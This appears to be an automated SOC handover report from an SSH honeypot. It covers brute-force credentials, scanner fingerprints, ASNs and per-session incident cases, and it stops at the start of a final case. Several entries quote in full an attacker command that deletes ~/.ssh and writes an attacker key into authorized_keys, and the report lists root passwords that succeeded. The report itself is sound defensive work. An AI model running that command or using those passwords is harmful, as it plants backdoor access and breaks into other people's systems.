# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-25 |
| **Generated At** | 2026-04-25T07:24:37Z |
| **Shift Time** | 07:24 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **97** |
| Confirmed Threats | **55** |
| False Positives Filtered | **42** (43.3%) |
| Unique Attacker IPs | **10** |
| Countries of Origin | **8** |
| High Severity Cases | **15** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **82** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **35** |
| Unique Credential Pairs | **24** |
| Unique Usernames | **13** |
| Unique Passwords | **24** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 15 |
| `345gs5662d34` | 5 |
| `ubuntu` | 4 |
| `admin` | 2 |
| `cistest` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 7 |
| `345gs5662d34` | 5 |
| `` | 2 |
| `fai` | 1 |
| `qwerty12345678` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 7 |
| `345gs5662d34` | `345gs5662d34` | 5 |
| `admin` | `` | 2 |
| `root` | `fai` | 1 |
| `root` | `qwerty12345678` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `fai` | `165.154.6.144` | 2026-04-25T05:52:18 |
| `root` | `3245gs5662d34` | `165.154.6.144` | 2026-04-25T05:52:22 |
| `root` | `qwerty12345678` | `165.154.6.144` | 2026-04-25T05:53:43 |
| `root` | `Qq123456789@` | `165.154.6.144` | 2026-04-25T05:57:48 |
| `root` | `as123456.` | `165.154.6.144` | 2026-04-25T06:02:48 |
| `root` | `xxxxxxxx` | `165.154.6.144` | 2026-04-25T06:04:05 |
| `root` | `9ol.!@#` | `223.123.65.63` | 2026-04-25T06:36:10 |
| `root` | `a123456o` | `223.123.65.63` | 2026-04-25T07:06:29 |
| `root` | `3245gs5662d34` | `223.123.65.63` | 2026-04-25T07:06:42 |
| `root` | `Root2021!@#` | `223.123.65.63` | 2026-04-25T07:15:10 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **97** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 50 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 22 | 1 |
| `03a80b21afa8...` | Modern SSH client | 20 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 22 | 1 | libssh-based |
| `03a80b21afa8...` | libssh | 20 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 8 | 2 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `223.123.65.63`, `165.154.6.144`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **10** |
| Unique ASNs | **10** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS30722` | Fastweb SpA | 1 | LOW |
| `AS138423` | CMPak Limited | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | LOW |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS59257` | CMPak Limited | 1 | HIGH |
| `AS205953` | NAZNET Bilisim ve Telekomunikasyon Elektronik Haberlesme Hiz. ith. ihr. San. ve Tic. Ltd. sti. | 1 | LOW |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS20011` | Dimension Data | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (15)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-48ec4ea86ef7

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]144` |
| **First Seen** | 2026-04-25 05:52 |
| **Last Seen** | 2026-04-25 05:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 05:52:17` | `cowrie.session.connect` |
| `2026-04-25 05:52:17` | `cowrie.client.version` |
| `2026-04-25 05:52:18` | `cowrie.client.kex` |
| `2026-04-25 05:52:18` | `cowrie.login.success` |
| `2026-04-25 05:52:18` | `cowrie.session.params` |
| `2026-04-25 05:52:18` | `cowrie.command.input` |
| `2026-04-25 05:52:18` | `cowrie.command.failed` |
| `2026-04-25 05:52:18` | `cowrie.log.closed` |
| `2026-04-25 05:52:19` | `cowrie.session.params` |
| `2026-04-25 05:52:19` | `cowrie.command.input` |
| `2026-04-25 05:52:19` | `cowrie.session.file_download` |
| `2026-04-25 05:52:19` | `cowrie.log.closed` |
| `2026-04-25 05:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]144` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-870b05ff6859

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]144` |
| **First Seen** | 2026-04-25 05:52 |
| **Last Seen** | 2026-04-25 05:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 05:52:22` | `cowrie.session.connect` |
| `2026-04-25 05:52:22` | `cowrie.client.version` |
| `2026-04-25 05:52:22` | `cowrie.client.kex` |
| `2026-04-25 05:52:22` | `cowrie.login.success` |
| `2026-04-25 05:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]144` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61fef9c4068b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]144` |
| **First Seen** | 2026-04-25 05:53 |
| **Last Seen** | 2026-04-25 05:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 05:53:43` | `cowrie.session.connect` |
| `2026-04-25 05:53:43` | `cowrie.client.version` |
| `2026-04-25 05:53:43` | `cowrie.client.kex` |
| `2026-04-25 05:53:43` | `cowrie.login.success` |
| `2026-04-25 05:53:44` | `cowrie.session.params` |
| `2026-04-25 05:53:44` | `cowrie.command.input` |
| `2026-04-25 05:53:44` | `cowrie.command.failed` |
| `2026-04-25 05:53:44` | `cowrie.log.closed` |
| `2026-04-25 05:53:44` | `cowrie.session.params` |
| `2026-04-25 05:53:44` | `cowrie.command.input` |
| `2026-04-25 05:53:44` | `cowrie.session.file_download` |
| `2026-04-25 05:53:44` | `cowrie.log.closed` |
| `2026-04-25 05:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]144` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d24c46b60c0

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]144` |
| **First Seen** | 2026-04-25 05:53 |
| **Last Seen** | 2026-04-25 05:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 05:53:47` | `cowrie.session.connect` |
| `2026-04-25 05:53:47` | `cowrie.client.version` |
| `2026-04-25 05:53:48` | `cowrie.client.kex` |
| `2026-04-25 05:53:48` | `cowrie.login.success` |
| `2026-04-25 05:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]144` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24f09a3839f8

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]144` |
| **First Seen** | 2026-04-25 05:57 |
| **Last Seen** | 2026-04-25 05:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 05:57:46` | `cowrie.session.connect` |
| `2026-04-25 05:57:46` | `cowrie.client.version` |
| `2026-04-25 05:57:47` | `cowrie.client.kex` |
| `2026-04-25 05:57:48` | `cowrie.login.success` |
| `2026-04-25 05:57:48` | `cowrie.session.params` |
| `2026-04-25 05:57:48` | `cowrie.command.input` |
| `2026-04-25 05:57:48` | `cowrie.command.failed` |
| `2026-04-25 05:57:48` | `cowrie.log.closed` |
| `2026-04-25 05:57:48` | `cowrie.session.params` |
| `2026-04-25 05:57:48` | `cowrie.command.input` |
| `2026-04-25 05:57:49` | `cowrie.session.file_download` |
| `2026-04-25 05:57:49` | `cowrie.log.closed` |
| `2026-04-25 05:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]144` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ca2127bffd9

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]144` |
| **First Seen** | 2026-04-25 05:57 |
| **Last Seen** | 2026-04-25 05:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 05:57:51` | `cowrie.session.connect` |
| `2026-04-25 05:57:51` | `cowrie.client.version` |
| `2026-04-25 05:57:51` | `cowrie.client.kex` |
| `2026-04-25 05:57:51` | `cowrie.login.success` |
| `2026-04-25 05:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]144` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-091284b0cd5c

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]144` |
| **First Seen** | 2026-04-25 06:02 |
| **Last Seen** | 2026-04-25 06:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 06:02:47` | `cowrie.session.connect` |
| `2026-04-25 06:02:47` | `cowrie.client.version` |
| `2026-04-25 06:02:48` | `cowrie.client.kex` |
| `2026-04-25 06:02:48` | `cowrie.login.success` |
| `2026-04-25 06:02:48` | `cowrie.session.params` |
| `2026-04-25 06:02:48` | `cowrie.command.input` |
| `2026-04-25 06:02:48` | `cowrie.command.failed` |
| `2026-04-25 06:02:48` | `cowrie.log.closed` |
| `2026-04-25 06:02:49` | `cowrie.session.params` |
| `2026-04-25 06:02:49` | `cowrie.command.input` |
| `2026-04-25 06:02:49` | `cowrie.session.file_download` |
| `2026-04-25 06:02:49` | `cowrie.log.closed` |
| `2026-04-25 06:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]144` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46d8357bc008

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]144` |
| **First Seen** | 2026-04-25 06:02 |
| **Last Seen** | 2026-04-25 06:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 06:02:51` | `cowrie.session.connect` |
| `2026-04-25 06:02:51` | `cowrie.client.version` |
| `2026-04-25 06:02:52` | `cowrie.client.kex` |
| `2026-04-25 06:02:52` | `cowrie.login.success` |
| `2026-04-25 06:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]144` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e6453bef417

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]144` |
| **First Seen** | 2026-04-25 06:04 |
| **Last Seen** | 2026-04-25 06:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 06:04:05` | `cowrie.session.connect` |
| `2026-04-25 06:04:05` | `cowrie.client.version` |
| `2026-04-25 06:04:05` | `cowrie.client.kex` |
| `2026-04-25 06:04:05` | `cowrie.login.success` |
| `2026-04-25 06:04:06` | `cowrie.session.params` |
| `2026-04-25 06:04:06` | `cowrie.command.input` |
| `2026-04-25 06:04:06` | `cowrie.command.failed` |
| `2026-04-25 06:04:06` | `cowrie.log.closed` |
| `2026-04-25 06:04:06` | `cowrie.session.params` |
| `2026-04-25 06:04:06` | `cowrie.command.input` |
| `2026-04-25 06:04:07` | `cowrie.session.file_download` |
| `2026-04-25 06:04:07` | `cowrie.log.closed` |
| `2026-04-25 06:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]144` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-160261c7e95b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]144` |
| **First Seen** | 2026-04-25 06:04 |
| **Last Seen** | 2026-04-25 06:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 06:04:09` | `cowrie.session.connect` |
| `2026-04-25 06:04:09` | `cowrie.client.version` |
| `2026-04-25 06:04:09` | `cowrie.client.kex` |
| `2026-04-25 06:04:10` | `cowrie.login.success` |
| `2026-04-25 06:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]144` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84fba0293560

| Field | Detail |
|---|---|
| **Source IP** | `223.123.65[.]63` |
| **First Seen** | 2026-04-25 06:36 |
| **Last Seen** | 2026-04-25 06:36 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 06:36:05` | `cowrie.session.connect` |
| `2026-04-25 06:36:05` | `cowrie.client.version` |
| `2026-04-25 06:36:05` | `cowrie.client.kex` |
| `2026-04-25 06:36:10` | `cowrie.login.success` |
| `2026-04-25 06:36:14` | `cowrie.session.params` |
| `2026-04-25 06:36:14` | `cowrie.command.input` |
| `2026-04-25 06:36:14` | `cowrie.command.failed` |
| `2026-04-25 06:36:16` | `cowrie.log.closed` |
| `2026-04-25 06:36:24` | `cowrie.session.params` |
| `2026-04-25 06:36:24` | `cowrie.command.input` |
| `2026-04-25 06:36:24` | `cowrie.session.file_download` |
| `2026-04-25 06:36:24` | `cowrie.log.closed` |
| `2026-04-25 06:36:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.123.65[.]63` to AbuseIPDB if not already reported
- [ ] Block `223.123.65[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00d45389e543

| Field | Detail |
|---|---|
| **Source IP** | `223.123.65[.]63` |
| **First Seen** | 2026-04-25 07:06 |
| **Last Seen** | 2026-04-25 07:06 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 07:06:27` | `cowrie.session.connect` |
| `2026-04-25 07:06:27` | `cowrie.client.version` |
| `2026-04-25 07:06:28` | `cowrie.client.kex` |
| `2026-04-25 07:06:29` | `cowrie.login.success` |
| `2026-04-25 07:06:30` | `cowrie.session.params` |
| `2026-04-25 07:06:30` | `cowrie.command.input` |
| `2026-04-25 07:06:30` | `cowrie.command.failed` |
| `2026-04-25 07:06:30` | `cowrie.log.closed` |
| `2026-04-25 07:06:32` | `cowrie.session.params` |
| `2026-04-25 07:06:32` | `cowrie.command.input` |
| `2026-04-25 07:06:32` | `cowrie.session.file_download` |
| `2026-04-25 07:06:32` | `cowrie.log.closed` |
| `2026-04-25 07:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.123.65[.]63` to AbuseIPDB if not already reported
- [ ] Block `223.123.65[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b64ca54c9d4

| Field | Detail |
|---|---|
| **Source IP** | `223.123.65[.]63` |
| **First Seen** | 2026-04-25 07:06 |
| **Last Seen** | 2026-04-25 07:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 07:06:39` | `cowrie.session.connect` |
| `2026-04-25 07:06:39` | `cowrie.client.version` |
| `2026-04-25 07:06:39` | `cowrie.client.kex` |
| `2026-04-25 07:06:42` | `cowrie.login.success` |
| `2026-04-25 07:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.123.65[.]63` to AbuseIPDB if not already reported
- [ ] Block `223.123.65[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cec70b610acc

| Field | Detail |
|---|---|
